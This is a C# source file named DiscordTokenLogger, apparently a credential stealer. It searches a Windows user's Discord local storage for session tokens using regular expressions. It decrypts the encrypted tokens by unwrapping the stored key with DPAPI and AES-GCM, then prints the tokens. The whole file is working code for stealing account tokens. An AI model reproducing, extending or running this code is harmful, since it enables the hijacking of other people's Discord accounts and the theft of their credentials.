using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace DiscordTokenLogger
{
    internal class Main
    {
        public static void Init()
        {
            Console.WriteLine("Made by https://github.com/Umbra999");
            Console.WriteLine(GrabTokens());
            Console.ReadLine();
        }

        private static string GrabTokens()
        {
            string Tokens = "";

            Regex BasicRegex = new(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            Regex NewRegex = new(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
            Regex EncryptedRegex = new("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new(file);
                string contents = File.ReadAllText(info.FullName);

                Match match1 = BasicRegex.Match(contents);
                if (match1.Success) Tokens += match1.Value + "\n";

                Match match2 = NewRegex.Match(contents);
                if (match2.Success) Tokens += match2.Value + "\n";

                Match match3 = EncryptedRegex.Match(contents);
                if (match3.Success)
                {
                    string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                    Tokens += token + "\n";
                }
            }

            return Tokens;
        }

        private static byte[] DecyrptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        private static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
    }
}
